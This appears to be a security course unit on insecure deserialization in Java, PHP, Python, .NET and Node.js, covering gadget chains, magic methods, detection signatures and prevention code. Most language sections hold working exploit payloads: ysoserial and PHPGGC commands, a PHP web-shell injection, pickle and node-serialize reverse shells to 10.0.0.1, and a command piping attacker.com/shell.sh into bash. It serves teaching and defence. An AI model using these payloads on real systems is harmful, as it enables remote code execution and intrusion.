# Unit 10: Other Web Vulnerabilities - Topic 4: Deserialization Vulnerabilities

## Overview

Insecure deserialization occurs when an application deserializes (reconstructs objects from serialized data) untrusted user input without proper validation. This vulnerability can lead to **Remote Code Execution (RCE)**, denial of service, authentication bypass, and other severe impacts. Deserialization vulnerabilities exist across virtually every programming language and framework, making them one of the most dangerous and versatile attack vectors in modern web applications.

---

## 1. Serialization and Deserialization Concepts

### What is Serialization?

```
Serialization:
┌─────────────────────┐     Serialize      ┌──────────────────────────┐
│   Object in Memory  │ ─────────────────► │  Byte Stream / String    │
│                     │                    │                          │
│  User {             │                    │  {"name":"admin",        │
│    name: "admin"    │                    │   "role":"admin",        │
│    role: "admin"    │                    │   "id": 1}               │
│    id: 1            │                    │                          │
│  }                  │                    │  (or binary format)      │
└─────────────────────┘                    └──────────────────────────┘

Deserialization:
┌──────────────────────────┐  Deserialize   ┌─────────────────────┐
│  Byte Stream / String    │ ─────────────► │   Object in Memory  │
│                          │                │                     │
│  {"name":"admin",        │                │  User {             │
│   "role":"admin",        │                │    name: "admin"    │
│   "id": 1}               │                │    role: "admin"    │
│                          │                │    id: 1            │
└──────────────────────────┘                └─────────────────────┘

The DANGER: If an attacker controls the serialized data,
they control what objects are created and how they behave!
```

### Common Serialization Formats

| Language | Format | Example |
|----------|--------|---------|
| **Java** | Binary (ObjectInputStream) | `AC ED 00 05` (magic bytes) |
| **PHP** | PHP serialize format | `O:4:"User":2:{s:4:"name";s:5:"admin";}` |
| **Python** | Pickle (binary/text) | `\x80\x04\x95...` |
| **.NET** | BinaryFormatter, JSON.NET | Various binary/JSON formats |
| **Ruby** | Marshal | `\x04\x08...` |
| **Node.js** | node-serialize, funcster | JSON with function strings |
| **YAML** | YAML.load | `!!python/object:...` |

### Where Serialized Data Appears

```
Common Locations:
├── Cookies (Base64-encoded serialized objects)
├── Hidden form fields
├── API request/response bodies
├── Session storage
├── Cache systems (Redis, Memcached)
├── Message queues (RabbitMQ, Kafka)
├── File uploads
├── Database BLOBs
├── HTTP headers (custom)
└── WebSocket messages
```

---

## 2. Java Deserialization

### Identifying Java Serialization

```bash
# Java serialized objects start with magic bytes:
# AC ED 00 05 (hex) = rO0AB (base64)

# In HTTP, look for:
# Base64-encoded cookies/parameters starting with "rO0AB"
# Content-Type: application/x-java-serialized-object
# Binary data starting with 0xACED0005

# Example cookie:
Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3...
```

### Java Gadget Chains

A gadget chain is a sequence of existing Java classes whose methods can be chained together to achieve arbitrary code execution during deserialization.

```
Deserialization Flow with Gadget Chain:
┌──────────────────┐
│ Serialized Object│
│ (Malicious)      │
└────────┬─────────┘
         │ ObjectInputStream.readObject()
         ▼
┌──────────────────┐
│ Gadget Class #1  │ ← readObject() triggers
│ (e.g., HashMap)  │
└────────┬─────────┘
         │ Calls method on inner object
         ▼
┌──────────────────┐
│ Gadget Class #2  │ ← Intermediate processing
│ (e.g., TiedMap)  │
└────────┬─────────┘
         │ Triggers transformation
         ▼
┌──────────────────┐
│ Gadget Class #3  │ ← InvokerTransformer
│ (Transformer)    │
└────────┬─────────┘
         │ Runtime.exec()
         ▼
┌──────────────────┐
│ COMMAND EXECUTED │ ← RCE Achieved!
│ (e.g., calc.exe) │
└──────────────────┘
```

### ysoserial — Java Deserialization Exploit Tool

```bash
# Generate payloads with ysoserial
# https://github.com/frohoff/ysoserial

# List available gadget chains
java -jar ysoserial.jar

# Common gadget chains:
# CommonsCollections1-7  (Apache Commons Collections)
# CommonsBeanutils1      (Apache Commons BeanUtils)
# Spring1-2              (Spring Framework)
# Groovy1                (Groovy)
# JRMPClient             (RMI)
# Hibernate1-2           (Hibernate)
# Jdk7u21               (JDK built-in)

# Generate payload - CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin

# Generate payload - CommonsCollections5 (reverse shell)
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjAuMC4xLzQ0NDMgMD4mMQ==}|{base64,-d}|{bash,-i}" \
  > payload.bin

# Base64 encode for cookies
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Send via curl
curl -b "session=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)" \
  http://target.com/dashboard

# Try multiple gadget chains
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Groovy1; do
    echo "Testing: $chain"
    java -jar ysoserial.jar $chain "curl http://COLLABORATOR.oastify.com/$chain" | \
      base64 -w0 | xargs -I{} curl -b "session={}" http://target.com/
done
```

### Java Deserialization Detection

```bash
# Look for these libraries in the application:
# - Apache Commons Collections (3.x and 4.x)
# - Spring Framework
# - Groovy
# - Apache Commons BeanUtils
# - JBoss/WildFly

# Check if endpoint accepts serialized data:
curl -X POST http://target.com/api \
  -H "Content-Type: application/x-java-serialized-object" \
  -d @payload.bin

# Use Java Deserialization Scanner (Burp Extension)
# Automatically tests for deserialization with multiple gadgets
```

---

## 3. PHP Object Injection

### PHP Serialize Format

```php
// PHP serialization format:
// b:1;                          → boolean true
// i:42;                         → integer 42
// d:3.14;                       → float 3.14
// s:5:"hello";                  → string "hello" (length 5)
// a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  → array ["foo","bar"]
// O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
//   ↑ Object of class "User" with 2 properties

// Vulnerable code:
$data = $_COOKIE['user_data'];
$user = unserialize($data);  // DANGEROUS!
```

### PHP Magic Methods

PHP objects have "magic methods" that are automatically called during the object lifecycle:

| Magic Method | When Called | Exploit Use |
|-------------|-------------|-------------|
| `__construct()` | Object creation | Initial setup |
| `__destruct()` | Object destruction | **Code execution on cleanup** |
| `__wakeup()` | After unserialize() | **Code execution on deserialization** |
| `__toString()` | Object used as string | **Triggered by echo/print** |
| `__call()` | Undefined method called | Method interception |
| `__get()` | Undefined property accessed | Property interception |
| `__set()` | Undefined property set | Property interception |

### PHP Exploitation Example

```php
// Target application has this class:
class FileManager {
    public $filename;
    public $content;
    
    public function __destruct() {
        // When object is garbage collected, write file
        file_put_contents($this->filename, $this->content);
    }
}

// Attacker creates malicious serialized object:
$exploit = new FileManager();
$exploit->filename = '/var/www/html/shell.php';
$exploit->content = '<?php system($_GET["cmd"]); ?>';
echo serialize($exploit);

// Output:
// O:11:"FileManager":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}

// Send in cookie:
Cookie: user_data=O:11:"FileManager":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}

// When the script ends, __destruct() is called
// → shell.php is written to the web root!
```

### POP Chains (Property-Oriented Programming)

```php
// Chain multiple classes together for exploitation
class Logger {
    public $logFile;
    public $logData;
    
    public function __destruct() {
        file_put_contents($this->logFile, $this->logData, FILE_APPEND);
    }
}

class DatabaseBackup {
    public $connection;
    
    public function __wakeup() {
        $this->connection->connect();  // Calls connect() on $connection
    }
}

class SystemCommand {
    public $cmd;
    
    public function connect() {
        system($this->cmd);  // RCE!
    }
}

// Build POP chain:
$cmd = new SystemCommand();
$cmd->cmd = "id";

$backup = new DatabaseBackup();
$backup->connection = $cmd;  // __wakeup() calls $cmd->connect()

echo serialize($backup);
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# https://github.com/ambionics/phpggc
# Equivalent of ysoserial for PHP

# List available gadgets
phpggc -l

# Generate Laravel RCE payload
phpggc Laravel/RCE1 system id

# Generate Monolog RCE payload
phpggc Monolog/RCE1 system "id"

# Generate WordPress payload
phpggc WordPress/RCE1 system "id"

# Base64 encode
phpggc Laravel/RCE1 system id -b

# URL encode
phpggc Laravel/RCE1 system id -u

# Supported frameworks:
# Laravel, Symfony, WordPress, Magento, Drupal,
# Yii, CakePHP, ZendFramework, Doctrine, Guzzle,
# Monolog, SwiftMailer, etc.
```

---

## 4. Python Pickle Exploitation

### How Python Pickle Works

```python
import pickle

# Serialization
data = {"user": "admin", "role": "admin"}
serialized = pickle.dumps(data)

# Deserialization
restored = pickle.loads(serialized)  # DANGEROUS with untrusted data!
```

### Pickle RCE Exploit

```python
import pickle
import os
import base64

# Method 1: Using __reduce__ magic method
class Exploit:
    def __reduce__(self):
        # __reduce__ returns a tuple: (callable, args)
        # pickle calls: os.system("id")
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Method 2: Reverse shell
class ReverseShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/10.0.0.1/4443 0>&1'],
        ))

payload = pickle.dumps(ReverseShell())

# Method 3: Custom pickle opcodes
import pickletools

# Raw pickle assembly for more complex payloads
exploit_pickle = b"""cos
system
(S'id'
tR."""

# Verify
pickletools.dis(exploit_pickle)

# Method 4: Using pickletools for analysis
pickletools.dis(pickle.dumps({"test": "data"}))
```

### Python YAML Deserialization

```python
# DANGEROUS - yaml.load with FullLoader/Loader
import yaml

# Malicious YAML payload
malicious_yaml = """
!!python/object/apply:os.system
- "id"
"""

# This executes os.system("id")
yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader)  # RCE!

# Even worse in older versions:
yaml.load(malicious_yaml)  # Default was UnsafeLoader

# Other YAML payloads:
# !!python/object/new:subprocess.check_output [["id"]]
# !!python/object/apply:subprocess.check_output [["id"]]
```

---

## 5. .NET Deserialization

### Common .NET Serializers

| Serializer | Risk Level | Notes |
|-----------|------------|-------|
| **BinaryFormatter** | CRITICAL | Known dangerous, deprecated |
| **ObjectStateFormatter** | CRITICAL | Used in ViewState |
| **NetDataContractSerializer** | CRITICAL | Includes type info |
| **SoapFormatter** | HIGH | SOAP-based serialization |
| **LosFormatter** | HIGH | Used in ViewState |
| **Json.NET (TypeNameHandling)** | HIGH | When TypeNameHandling != None |
| **DataContractSerializer** | LOW | Safer by design |
| **XmlSerializer** | LOW | Type-safe |

### .NET Exploitation with ysoserial.net

```bash
# https://github.com/pwntester/ysoserial.net

# Generate BinaryFormatter payload
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe"

# Generate ObjectStateFormatter payload (ViewState)
ysoserial.exe -g TextFormattingRunProperties -f ObjectStateFormatter -c "cmd /c whoami"

# Generate Json.NET payload
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# Common gadget chains:
# ActivitySurrogateSelector
# ObjectDataProvider
# TextFormattingRunProperties
# TypeConfuseDelegate
# WindowsIdentity
# PSObject
```

### ASP.NET ViewState Deserialization

```bash
# ViewState is a serialized .NET object in hidden form fields
# __VIEWSTATE parameter in ASP.NET forms

# If MAC validation is disabled or key is known:
# 1. Decode ViewState
echo "BASE64_VIEWSTATE" | base64 -d | xxd | head

# 2. Generate malicious ViewState
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "cmd /c whoami > C:\inetpub\wwwroot\output.txt" \
  --path="/vulnerable.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="KEY" \
  --validationalg="SHA1" \
  --validationkey="KEY"

# 3. Submit malicious ViewState in POST request
```

---

## 6. Node.js Deserialization

### node-serialize Vulnerability

```javascript
// Vulnerable code using node-serialize
var serialize = require('node-serialize');

// User input from cookie
var data = req.cookies.profile;
var obj = serialize.unserialize(data);  // DANGEROUS!

// Exploit payload - Immediately Invoked Function Expression (IIFE)
var payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr){/* */})}()"
};

// Serialize and send as cookie
// The () at the end causes immediate execution upon deserialization
```

### node-serialize RCE Payload

```javascript
// Generate payload
var y = {
    rce: function() {
        require('child_process').exec('curl http://attacker.com/shell.sh | bash');
    }
};

var serialize = require('node-serialize');
var payload = serialize.serialize(y);

// Add IIFE brackets
payload = payload.replace('"}}', '"()}}`);

// Base64 encode
Buffer.from(payload).toString('base64');

// Reverse shell payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4443 0>&1\"')}()"}
```

---

## 7. Detection and Testing Methodology

### Identifying Deserialization Points

```
Detection Checklist:
┌─────────────────────────────────────────────────────────┐
│ 1. Look for serialized data in:                         │
│    □ Cookies (Base64 encoded)                           │
│    □ Hidden form fields (__VIEWSTATE, etc.)              │
│    □ API request bodies                                 │
│    □ Custom HTTP headers                                │
│    □ URL parameters                                     │
│                                                         │
│ 2. Identify serialization format:                       │
│    □ Java: starts with "rO0AB" (base64) or 0xACED       │
│    □ PHP: starts with "O:", "a:", "s:", etc.             │
│    □ Python: pickle opcodes                             │
│    □ .NET: starts with 0x00 0x01 (BinaryFormatter)      │
│    □ JSON with type info: "$type", "__type"              │
│                                                         │
│ 3. Test for vulnerable behavior:                        │
│    □ Modify serialized data → application error?        │
│    □ Change class name → ClassNotFoundException?        │
│    □ Invalid data → stack trace reveals deserializer?   │
│                                                         │
│ 4. Exploit:                                             │
│    □ Use ysoserial (Java) / PHPGGC (PHP)                │
│    □ Custom pickle payloads (Python)                    │
│    □ ysoserial.net (.NET)                               │
│    □ OOB detection for blind deserialization             │
└─────────────────────────────────────────────────────────┘
```

### Burp Suite Extensions

```
Java Deserialization Scanner
  - Automatically identifies Java deserialization
  - Tests multiple gadget chains
  - Supports blind detection via sleep/DNS

Java Serial Killer
  - Manual testing interface
  - Custom gadget chain support

Freddy (Deserialization Bug Finder)
  - Multi-language support
  - Passive and active scanning
  - Java, .NET, PHP detection
```

### Detection Signatures

| Language | Magic Bytes / Pattern | Base64 Prefix |
|----------|----------------------|---------------|
| Java | `AC ED 00 05` | `rO0AB` |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` |
| Python Pickle v2 | `80 02` | `gAI` |
| Python Pickle v4 | `80 04 95` | `gASV` |
| PHP Serialize | `O:`, `a:`, `s:` (text) | N/A (text) |
| Ruby Marshal | `04 08` | `BAg` |

---

## 8. Prevention Techniques

### Language-Specific Mitigations

**Java:**
```java
// 1. Use look-ahead ObjectInputStream (whitelist classes)
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "java.lang.String",
        "java.lang.Integer",
        "com.myapp.SafeDTO"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized class: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// 2. Use serialization filters (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.*;!*"  // Allow only com.myapp classes
);
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);

// 3. Use safe alternatives: JSON (Jackson/Gson without type info)
```

**PHP:**
```php
// 1. Never unserialize untrusted data
// Use json_decode instead of unserialize
$data = json_decode($input, true);  // SAFE

// 2. If unserialize is required, use allowed_classes
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);

// 3. Or disable all classes
$data = unserialize($input, ['allowed_classes' => false]);
```

**Python:**
```python
# 1. Never use pickle with untrusted data
# Use JSON instead
import json
data = json.loads(untrusted_input)  # SAFE

# 2. Use yaml.safe_load instead of yaml.load
import yaml
data = yaml.safe_load(untrusted_input)  # SAFE

# 3. If pickle is necessary, use restricted unpickler
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {'datetime.datetime', 'collections.OrderedDict'}
    
    def find_class(self, module, name):
        full_name = f"{module}.{name}"
        if full_name not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(f"Forbidden: {full_name}")
        return super().find_class(module, name)

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

### General Prevention Strategies

| Strategy | Description |
|----------|-------------|
| **Avoid native serialization** | Use JSON, XML, or Protocol Buffers instead |
| **Input validation** | Validate serialized data integrity (HMAC/signature) |
| **Type whitelisting** | Only allow known safe classes to be deserialized |
| **Least privilege** | Run application with minimal permissions |
| **Monitoring** | Log and alert on deserialization errors |
| **Library updates** | Keep serialization libraries patched |
| **WAF rules** | Detect known serialization magic bytes |
| **Integrity checks** | Sign serialized data (HMAC) to prevent tampering |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Java Deser** | ysoserial, gadget chains (CommonsCollections), magic bytes `AC ED 00 05` |
| **PHP Object Injection** | `unserialize()`, magic methods (`__destruct`, `__wakeup`), PHPGGC |
| **Python Pickle** | `__reduce__` method, `pickle.loads()`, YAML unsafe load |
| **.NET Deser** | BinaryFormatter, ViewState, ysoserial.net |
| **Node.js** | `node-serialize`, IIFE execution `_$$ND_FUNC$$_` |
| **Detection** | Magic bytes, error messages, Burp extensions |
| **Prevention** | Avoid native serialization, use JSON, whitelist classes, sign data |

---

## Revision Questions

1. Explain what a "gadget chain" is in the context of Java deserialization attacks. Why do attackers need existing classes on the classpath?
2. How do PHP magic methods (`__destruct`, `__wakeup`, `__toString`) enable object injection attacks?
3. Demonstrate how Python's `__reduce__` method can be exploited in a pickle deserialization attack.
4. What is the difference between BinaryFormatter and DataContractSerializer in .NET? Why is one considered safe and the other dangerous?
5. Describe how you would detect deserialization vulnerabilities in a black-box penetration test.
6. What is a POP chain and how does it differ from a gadget chain?

---

*Previous: [03-ssrf.md](03-ssrf.md) | Next: [05-business-logic-flaws.md](05-business-logic-flaws.md)*

---

*[Back to README](../README.md)*
